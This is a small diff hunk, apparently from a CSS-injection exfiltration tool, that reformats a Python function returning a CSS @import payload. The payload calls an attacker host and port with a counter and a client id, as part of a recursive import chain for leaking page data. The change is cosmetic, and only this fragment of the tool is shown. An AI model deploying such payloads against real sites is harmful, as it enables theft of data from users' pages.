@@ -41,6 +41,4 @@ def generate_payload_recursive_import(hostname, port, attribut, element, client)
 
 
 def generate_next_import(hostname, port, client):
-    return (
-        f"@import url('//{hostname}:{port}/n?n={client.counter}&cid={client.id}');"
-    )
+    return f"@import url('//{hostname}:{port}/n?n={client.counter}&cid={client.id}');"
